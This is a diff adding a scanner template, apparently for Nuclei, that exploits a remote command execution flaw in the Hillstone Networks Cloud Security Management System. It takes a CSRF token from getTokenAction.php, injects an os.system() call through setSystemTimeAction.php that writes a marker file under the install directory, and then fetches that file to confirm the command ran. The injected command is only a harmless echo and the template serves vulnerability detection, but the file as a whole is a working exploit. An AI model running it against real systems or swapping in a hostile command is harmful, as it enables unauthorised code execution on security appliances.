@@ -1,0 +1,70 @@
+id: poc-yaml-hillstonenet-setsystemtimeaction-rce
+
+info:
+  name: Hillstone Networks Cloud Security Management System RCE
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce
+  description: |
+    Exploits a remote command execution vulnerability in the Hillstone Networks Cloud Security Management System using the `setsystemtimeaction` endpoint.
+
+variables:
+  t1: "{{rand_int(111000, 999000)}}"
+  t2: "{{rand_int(111000111000, 999000999000)}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: get-token
+    method: POST
+    path:
+      - "/master/ajaxActions/getTokenAction.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=emhpeXVhbg;"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?P<token>^[a-f0-9]{32})"
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        internal: true
+        regex:
+          - "(?P<token>^[a-f0-9]{32})"
+
+  - id: execute-command
+    method: POST
+    path:
+      - "/master/ajaxActions/setSystemTimeAction.php?token_csrf={{token}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=emhpeXVhbg;"
+    body: |
+      param=os.system('echo+{{t2}}+>+/opt/var/majorsec/installation/master/runtime/img/config{{t1}}')
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-command
+    method: GET
+    path:
+      - "/master/img/config{{t1}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Cookie: "PHPSESSID=emhpeXVhbg;"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
